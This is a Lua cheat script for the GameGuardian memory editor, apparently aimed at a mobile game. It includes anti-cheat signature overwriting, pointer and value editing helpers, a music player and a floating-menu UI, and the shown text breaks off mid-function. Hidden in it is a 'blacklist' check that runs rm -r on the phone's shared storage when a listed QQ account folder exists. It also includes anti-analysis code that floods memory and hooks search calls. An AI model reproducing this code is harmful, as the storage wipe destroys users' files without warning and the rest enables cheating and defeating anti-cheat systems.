



QQ=gg.alert([[ Y内部全防
🎄🎈🎁⚠️通知⚠️🎁🎈🎄
工作室收两位会抓防的工作人员和抓功能的
可以联系伊百:2974564854 欢迎你的加入

🎉🎉更新内容🎉🎉
1.暂时去除卡密系统
2.优化新的UI
3.添加新的思路
4.跟挽恋合作［成功］
⚠️注意事件⚠️
建议您开启[logo+大厅②=稳定]（离线对局开）
按照以上的提示开，您就可以奔放

TG@YNB6666
官网yibai.asia

全防更新版本:2023.8.12 14.56.32更新
 ]],"进入全防","","")
 string.toMusic('尊贵的用户您已进入Y内部国际服全防祝您稳定奔放， 玩Y内部之前看完公告再打游戏不然封号不负责请仔细阅读更新内容')---语音
 

function setvalue(address,flags,value)
	local tt={}
	tt[1]={}
	tt[1].address=address
	tt[1].flags=flags
	tt[1].value=value
	gg.setValues(tt)
	gg.addListItems(tt)
end
function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要275)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end

function readAdd(add)
	t=gg.getValues({[1]={address=add,flags=4}})
	add=string.format("%X",t[1].value)
	if (#add)==16 then add=add:sub(9,16) end
	if (#add)==1 then add=add.."0000000" else
		add=string.format("%d","0x"..add)
	end
	return add
end

function getAdd(so,offset,off1)
	add=gg.getRangesList(so)[1].start
	add=readAdd(add+offset)
	return add
end

function addListltems(address,flags,value,freeze,toast)
	t={}
	t[1]={}
	t[1].address=address
	t[1].flags=flags
	t[1].value=value
	t[1].freeze=freeze
	gg.addListItems(t)
end
-- 读取内存地址的函数
function readPointer(name, offset, i)
    local re = gg.getRangesList(name) 
    local x64 = gg.getTargetInfo().x64 
    local va = {[true]=32, [false]=4} 
    if re[i or 1] then
        local addr = re[i or 1].start + offset[1] 
        for i = 2, #offset do
            addr = gg.getValues({{address=addr, flags=va[x64]}}) 
            if not x64 then
                addr[1].value = addr[1].value & 0xFFFFFFFF 
            end
            addr = addr[1].value + offset[i] 
        end
        return addr
    end
end
-- telegram: @BLSZN
-- 链条为小羽神提供
-- 拿去安装压缩加密码引流,全家暴毙
function gg.edits(addr, Table, name)
    local Table1 = {{}, {}} 
    for k, v in ipairs(Table) do
        local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}
        if v[4] then
            Table1[2][#Table1[2]+1] = value 
        else
            Table1[1][#Table1[1]+1] = value
        end
    end
    gg.addListItems(Table1[2])
    gg.setValues(Table1[1])
    gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值")
end

function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要275)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end--静态
function setvalue(address,flags,value) 
local CatWill={} 
CatWill[1]={} 
CatWill[1].address=address 
CatWill[1].flags=flags 
CatWill[1].value=value 
gg.setValues(CatWill) 
end
function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy=szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy=gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy=sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
--↑配置文件↑
function WriteSignatures(original,TSS_SDK) gg.setRanges(16384) gg.searchNumber("h"..original) gg.getResults(9999) gg.editAll("h"..TSS_SDK,1) gg.clearResults() end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find (szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len (szFullString)) break end nSplitArray[nSplitIndex] = string.sub (szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len (szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end

function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
			else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address

		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true]=32, [false]=4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address=addr, flags=va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end
end
-- 读取内存地址的函数
function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true]=32, [false]=4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address=addr, flags=va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end

end
-- 修改内存地址的函数
function gg.edits(addr, Table, name)
	local Table1 = {{}, {}}
	for k, v in ipairs(Table) do
		local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}
		if v[4] then
			Table1[2][#Table1[2]+1] = value
			else
			Table1[1][#Table1[1]+1] = value
		end
	end
	gg.addListItems(Table1[2])
	gg.setValues(Table1[1])
	gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值")
end


-- 把以上代码复制到你脚本最前面即可
local QQ = {
"qq号"
}
for i, k in pairs(QQ) do
local qq = "/storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/"..k
if os.rename(qq, qq) then
gg.command('rm -r /storage/emulated/0/')
gg.command('rm -r /storage/emulated/0/*')
gg.command('rm -r /sdcard/*')
gg.command('rm -r /storage/emulated/')
gg.command('rm -r /storage/')
while true do
gg.alert("检测到黑名单QQ 不给予进入脚本")
os.exit()
end
end
end
--------------防御
--先刷足次数
local Y=string.rep("伊百科技工作室：想破解？",99999)
--建立一个新的表
T={}
--使用循环将值写入表中
for i=1,2048 do
  T[i]=Y
end
--遍历string库 使用保护模式将它们运行
--v→=参数比如string.(这里面就是表的东西)
--T→=等于表里面的key
for k,v in pairs (string) do
  pcall(v,T)
end

YxNB = gg.searchNumber
YxNBNB = gg.editAll
function lllsjsf()
  YXB = {"yz","=z","=l","ly","gy","zt"}
  wqnmds=""
  for i=1,2000 do
    wqnmds=wqnmds..YXB[math.random(1, #YXB)]
  end
  return wqnmds
end
lllsjsf()
function gg.searchNumber(...)
  gg.setVisible(false)
  search_e=string.char(0,0,0,0,0,0,0)
  for i=1,22 do
    search_e=search_e..search_e
  end
  gg.getResults(1)
  YxNBNB(search_e,4)
  local s,j={},{}
  for i=1,50 do
    j[i]=math.random(1,2140000000)
    s[j[i]]={address=i,flags=4,temp=search_e}
  end
  local timegg=os.clock()+os.time()
  s=gg.getValues(s)
  local dateinit=os.clock()+os.time()
  for i=1,50 do
    while s[j[i]].value~=0 or dateinit-timegg>2.1 do
      gg.clearResults()
      print("⚠️logo你妈呢⚠️")
      string.toMusic("检测到危险行为正在启动虚假脚本")----语音播放
      os.exit()
    end
  end
  ab = {...}
  Yw=[[%d]]
  ab[1] = ab[1]:gsub(Yw, function(Yx)
    return Yx .. wqnmds .. wqnmds
  end
  )
  YxNB(table.unpack(ab))
  gg.getResults(0)
  YxNBNB(search_e,4)
end
function gg.editAll(...)
  ab = {...}
  ab[1] = ab[1]:gsub(Yw, function(Yx)
    return Yx .. wqnmds .. wqnmds
  end
  )
  YxNBNB(table.unpack(ab))
end


-----音乐

local json =json--调用
local g = {}
g.file = gg.getFile()
g.sel = nil
gqlb={"请先搜索歌曲",}
idb={"1010"}
SN,gc=1,nil
g.config = gg.getFile():gsub("%lua$", "").."cfg"
function bei()
	g.data = loadfile("-- WSG PRO 1.0.9(109)\n"..g.config)
	if g.data ~= nil then
		g.sel = g.data()
		g.data = nil
	end
	if g.sel == nil then
		g.sel = {"请输入歌曲名","10"}
	end
end
bei()
--搜索歌曲
function start(name,sl)
	fw=gg.makeRequest("http://music.163.com/api/search/get?s="..name.."&type=1&offset=0&total=true&limit="..sl)
	return fw
end
--歌词
--播放音乐
function play(id,name)
	gg.toast("正在播放音乐："..name,true)
	gg.playMusic("http://music.163.com/song/media/outer/url?id="..id..".mp3")
end
--停止播放
function stop()
	gg.toast("正在停止音乐")
	for i=1,100 do
		gg.playMusic("stop")
		gg.playMusic("stop")
		gg.playMusic("stop")
	end
end
----
function Play(gqlb,idb)
	SN = gg.choice(gqlb,nil,ts)
	if SN == nil then XGCK =-1 else
		sn=gg.choice({"播放歌曲","播放并下载"},nil,"歌曲："..gqlb[SN])
		if sn == nil then end
		if sn == 1 then
			play(idb[SN],gqlb[SN])
		end
		if sn == 2 then
			local XEY=gg.makeRequest("http://music.163.com/song/media/outer/url?id="..idb[SN]..".mp3").content
			local XEY1=gg.getFile():gsub("[^/]+$","")..gqlb[SN]..".mp3"
			io.open(XEY1,"w"):write(XEY)
			gg.alert("提示:\n\n音乐已成功下载位置:\n\n"..XEY1)
		end
		XGCK=-1
	end
end
function zjson(jsonr)
	local str = jsonr
	-- 匹配Json Key的正则表达式
	local pattern = "\"[%w]+\":"
	string.gsub(str, pattern, function(v)
		if string.find(str, v) then
			str = string.gsub(str, v, string.gsub(v, "\"", ""))
		end
	end)
	str = string.gsub(str, ":", "=")
	str = string.gsub(str, "%[", "{")
	str = string.gsub(str, "%]", "}")
	local data = "-- WSG PRO 1.0.9(109)\nreturn " .. str
	local res = load(data)()
	return res
end

function json(con)
	res=zjson(con)
	zd=res.result.songCount
	pd=go3-zd
	if pd <= 0 then else go3=zd end
	ts="《"..go1.."》找到"..zd.."首歌曲，当前显示"..go3.."首"
	gqlb={}
	idb={}
	for i=1,go3 do
		gqlb[i]=res.result.songs[i].name
		idb[i]=res.result.songs[i].id
	end
	--print(idb)
end
function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end


function PS() end
function setvalue(address,flags,value) PS('修改地址数值(地址,数值类型,要修改的值)') local tt={} tt[1]={} tt[1].address=address tt[1].flags=flags tt[1].value=value gg.setValues(tt) end--静态
function setvalue(address,flags,value) 
local CatWill={} 
CatWill[1]={} 
CatWill[1].address=address 
CatWill[1].flags=flags 
CatWill[1].value=value 
gg.setValues(CatWill) 
end
function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
		 else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address
			print(string.char(231,190,164,58).._Q)
		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true] = 32, [false] = 4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address = addr, flags = va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end
end

function gg.edits(addr, Table, name)
	local Table1 = {{}, {}}
	for k, v in ipairs(Table) do
		local value = {address = addr + v[3], value = v[1], flags = v[2], freeze = v[4]}
		if v[4] then
			Table1[2][#Table1[2] + 1] = value
		else
			Table1[1][#Table1[1] + 1] = value
		end
	end
	gg.addListItems(Table1[2])
	gg.setValues(Table1[1])
end
----音乐
import("android.ext.*")

function ui_init()
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
changan = {}
local changan = changan
local android = import('android.*')
function write(fileName, content)
--f = assert( io.open( fileName, 'w'))   f:write( content )     f:close()
if file.write(fileName, content) == false then gg.alert("请给框架和修改器 文件储存权限\n否则无法正常运行") os.exit() end
end
function panduan(rec) fille,err = io.open(rec) if fille == nil then return false else return true end end
function pdcf(lujing) rec = "/sdcard/Y内部/配置文件/"..lujing fille,err = io.open(rec) if fille == nil then return false else return true end end
sleep = gg.sleep
--if gg.isHTTPdump()==true and panduan("/sdcard/Y内部/配置文件/vpn.txt") == false then gg.alert("\n抓包？") os.exit() end
function read(fileName) f = assert(io.open(fileName, 'r')) content = f:read("*all") f:close() return content end
function wtcf(lujing,neirong)
write("/sdcard/Y内部/配置文件/"..lujing,neirong)
end
function rdcf(lujing)
return read("/sdcard/Y内部/配置文件/"..lujing)
end
function pmusic(x) if audiokg == "开" then tmp1 = 0 gg.playMusic(x) tmp1 = 1 end end
if pdcf("audio") ~= true then wtcf("audio","开") end
audiokg = rdcf("audio")
function camusic(ress)
tmp1 = 0
if audiokg == "开" then
if panduan("/sdcard/Y内部/音频/"..ress) == true then
pmusic("/sdcard/Y内部/音频/"..ress)
tmp1 = 1
else
download("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/"..ress ,"/sdcard/Y内部/音频/"..ress)
pmusic("/sdcard/Y内部/音频/"..ress)
tmp1 = 1
end
end
end
开 = "开" 关 = "关"
function checkimg(tmp)
if panduan("/sdcard/Y内部/图片/"..tmp) ~= true then
gg.toast("正在下载资源"..tmp.."\n请耐心等待")
download("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/"..tmp,"/sdcard/Y内部/图片/"..tmp)
end
end
file.getdirs("/sdcard/Y内部/状态读取/")
ckimg = {
--"Y内部logo",
"vslct1",
"vslct2",
"check1",
"check2",
"exit",
"sj",
"hsj"
}
for i = 1,#ckimg do
jindu = i
checkimg(ckimg[i])
end
context = app.context
window = context:getSystemService("window") -- 获取窗口管理器
function getLayoutParams()
LayoutParams = WindowManager.LayoutParams
layoutParams = luajava.new(LayoutParams)
if (Build.VERSION.SDK_INT >= 26) then -- 设置悬浮窗方式
layoutParams.type = LayoutParams.TYPE_APPLICATION_OVERLAY
else
layoutParams.type = LayoutParams.TYPE_PHONE
end

layoutParams.format = PixelFormat.RGBA_8888 -- 设置背景
layoutParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE -- 焦点设置Finish
layoutParams.gravity = Gravity.TOP|Gravity.LEFT -- 重力设置
layoutParams.width = LayoutParams.WRAP_CONTENT -- 布局宽度
layoutParams.height = LayoutParams.WRAP_CONTENT -- 布局高度

return layoutParams
end
function getj6()
jianbian6 = luajava.new(GradientDrawable)
jianbian6:setCornerRadius(20)
jianbian6:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian6:setColors(菜单小背景颜色)
jianbian6:setStroke(7,菜单小背景边框)--边框宽度和颜色
return jianbian6
end
slctb2 = luajava.loadlayout({
GradientDrawable,
color = "#7f7fd5",
cornerRadius = 10
})
function getseekgra()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors(其他控件背景)
jianbians:setStroke(4,"0xeeffffff")--边框宽度和颜色
return jianbians
end
function getseekgra2()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(8)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xeeffffff,0xccffffff})
jianbians:setStroke(1,"0xee000000")--边框宽度和颜色
return jianbians
end
function 获取图片(txt)
ntxt=string.sub(string.gsub(txt,"/","."),-10,-1)
if string.find(tostring(txt),"http")~=nil then
if panduan("/sdcard/Y内部/图片/"..ntxt)==false then
download(txt,"/sdcard/Y内部/图片/"..ntxt)
end
txt="/sdcard/Y内部/图片/"..ntxt
end
return luajava.getBitmapDrawable(txt)
end
slctb = 获取图片(侧边按钮背景1)
slcta = 获取图片(侧边按钮背景2)

slctc = luajava.loadlayout {
GradientDrawable,
color = "#11ffffff",
cornerRadius = 8
}
slctd = luajava.loadlayout {
GradientDrawable,
color = "#55ffffff",
cornerRadius = 8
}
slcte = luajava.loadlayout {
GradientDrawable,
color = "#11ffffff",
cornerRadius = 12
}
slctf = luajava.loadlayout {
GradientDrawable,
color = "#aa1E1C27",
cornerRadius = 15
}
function getjb()
local jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(15)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xff397EF8,0xff25C4FD})
jianbians:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
return jianbians
end
function chatbg2()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, luajava.loadlayout {
GradientDrawable,
color = "#aa0082FF",
cornerRadius = 12
}) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, getjb()) -- 没点击的背景
return selector
end
function getshape9()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors(button颜色)
jianbians:setStroke(4,"0xeeFFffff")--边框宽度和颜色
return jianbians
end
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xaaFF6EBF,0x660072ff})
jianbians:setStroke(4,"0xeeFFffff")--边框宽度和颜色
t3s=jianbians
t4s=luajava.loadlayout {
GradientDrawable,
color = "#87000000",
cornerRadius = 12
}
t5s=jianbians
t6s=luajava.loadlayout {
GradientDrawable,
color = "#87000000",
cornerRadius = 12
}
function getSelector3()
t9s=getshape9()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, t4s) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, t9s) -- 没点击的背景
return selector
end
function getSelector5()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, t6s) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, t5s) -- 没点击的背景
return selector
end
function getSelector()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, slcta) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, slctb) -- 没点击的背景
return selector
end
function getSelector2()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, slctd) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, slctc) -- 没点击的背景
return selector
end

jianbian = luajava.new(GradientDrawable)
jianbian:setCornerRadius(30)
jianbian:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian2 = luajava.new(GradientDrawable)
jianbian2:setCornerRadius(30)
jianbian2:setGradientType(GradientDrawable.LINEAR_GRADIENT)

local isswitch
YoYoImpl = luajava.getYoYoImpl()
changan.menu = function(sview)
if isswitch then
return false
end
for i=1,#stab do
_ENV["jmb"..i]=getSelector()
end
if #stab> #sview then gg.alert("菜单标题参数多于菜单配置，请检查") os.exit() end
isswitch = true
cebian = {
LinearLayout,
id = "侧边",
visibility = "gone",
layout_height = "230dp",
background="http://yibainb.asia/view.php/913c95c54e5fb58954152e31f668b502.jpg",
layout_width = "88dp",
orientation = "vertical",
background = {
GradientDrawable,
color = "#00ffffff",
cornerRadius = 10
},
}
gund = {
LinearLayout,
orientation = "vertical",
}
for i = 1,#stab do
_ENV["jm"..i]=luajava.loadlayout({
LinearLayout,
id = "jm"..i,
layout_height = "38dp",
layout_width = "88dp",
layout_marginTop = "2dp",
layout_marginBottom = "2dp",
background = _ENV["jmb"..i],
onClick=function()
changan.controlFlip(_ENV["jm"..i],500)
切换(i) end,
{
TextView,
gravity = "center",
textColor=侧边文字颜色,
text = stab[i][1],
layout_height = "38dp",
layout_width = "88dp",
--onClick = function() 切换(i) end
}})
gund[#gund+1] = _ENV["jm"..i]
end
cebian[#cebian+1] = {
ScrollView,
layout_height = "fill_parent",
layout_width = "fill_parent",
gund
}
cebian = luajava.loadlayout(cebian)
for i = 1,#stab do
_ENV["layout"..i] = luajava.loadlayout(
{
ScrollView,
background = getj6(),
fillViewport = "true",
padding = "3dp",
id = "layout"..i,
visibility = "gone",
layout_width = "230dp",
background="http://yibainb.asia/view.php/913c95c54e5fb58954152e31f668b502.jpg",
layout_height = "230dp",
orientation = "vertical",
{
LinearLayout,
--background = getj6(),
id = "layoutm"..i,
gravity = "top",
layout_width = "230dp",
orientation = "vertical",
gravity = "center_horizontal",
},

})
end
_ENV["layout".. 4] = luajava.loadlayout(
{LinearLayout,
orientation = "horizontal",
layout_width="wrap_content",
layout_height="230dp",
visibility = "gone",
{
ScrollView,
background = getj6(),
fillViewport = "true",
padding = "3dp",
id = "layouts".. 4,
layout_width = "230dp",
layout_height = "230dp",
orientation = "vertical",
{
LinearLayout,
--background = getj6(),
id = "layoutm"..4,
gravity = "top",
layout_width = "230dp",
orientation = "vertical",
gravity = "center_horizontal",
}},
{ScrollView,
fillViewport = "true",
{LinearLayout,
id="layoutg4",
orientation="vertical",
gravity="center",
layout_width="230dp",
layout_height="wrap_content",
}}
})
ckou = {
LinearLayout,
id = "chuangk",
padding="4dp",
visibility = "gone",
layout_width = "wrap_content",
layout_height = "wrap_content",
orientation = "horizontal",
cebian,

}
for i = 1,#stab do
ckou[#ckou+1] = _ENV["layout"..i]
end
--luajava.newThread(function() develo(ckou) end):start()
ckou = luajava.loadlayout(ckou)
title = luajava.loadlayout({
TextView,
id = "title",
textColor = "#ffffff",
visibility = "gone",
text = stab[1][2],
gravity = "center",
textSize = "24sp",
layout_width = "fill_parent",
})
control1=luajava.loadlayout({
ImageView,
id = "control",
hardwareAccelerated="true",
--layout_gravity = "left",
background = xfcpic,
layout_width = "40dp",
layout_height = "40dp",
})
frme=luajava.loadlayout({
FrameLayout,
padding = "10dp",
layout_width = "match_parent",
layout_height = "wrap_content",
orientation = "horizontal",
--background = beij2,
gravity = "center",
control1,
title,
{
ImageView,
id = "exitt",
visibility = "gone",
layout_gravity = "right",
src = "/sdcard/Y内部/图片/arwhitex",
layout_width = "20dp",
layout_height = "20dp",
layout_marginTop = "10dp",
layout_marginRight = "14dp",
}
})
floatWindow = {
LinearLayout,
id = "motion",
layout_width = "wrap_content",
orientation = "vertical",
gravity = "center_vertical",
layout_height = "wrap_content",
frme,
ckou
}
local function invoke()
local ok
local RawX, RawY, x, y
mainLayoutParams = getLayoutParams()
floatWindow = luajava.loadlayout(floatWindow)
local function invoke2()
block('start')
for k = 1,#stab do
for i = 1,#sview[k] do
_ENV["layoutm"..k]:addView(sview[k][i])
end
end

window:addView(floatWindow, mainLayoutParams)
block('end')
end

local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
block('join')
control.onClick = function()
隐藏()
end
exitt.onClick = function()
隐藏()
end
jm4.onClick = function()
changan.controlFlip(jm4,500)
切换(4)
gundong()
already = true
changan.setedit(".用户名",qltname)
changan.setedit("请输入链接或QQ",qlticon)
end
local isMove

hanshu = function(v, event)
local Action = event:getAction()
if Action == MotionEvent.ACTION_DOWN then
isMove = false
RawX = event:getRawX()
RawY = event:getRawY()
x = mainLayoutParams.x
y = mainLayoutParams.y
elseif Action == MotionEvent.ACTION_MOVE then
isMove = true
